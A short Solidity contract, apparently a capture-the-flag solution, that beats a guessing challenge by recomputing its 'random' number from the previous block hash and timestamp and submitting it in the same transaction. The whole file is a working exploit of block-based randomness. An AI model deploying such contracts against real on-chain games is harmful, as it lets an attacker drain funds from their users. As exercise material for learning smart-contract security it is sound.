// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

import "./Challenge.sol";

contract GuessingTheNewNumber {

    FindNextChallenge public ctr;

    constructor(address challengeContract) {
        ctr = FindNextChallenge(challengeContract);
    }
    
    function callme() public {
        uint8 guess = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number -1), block.timestamp))));
        ctr.callme(guess);
    }
}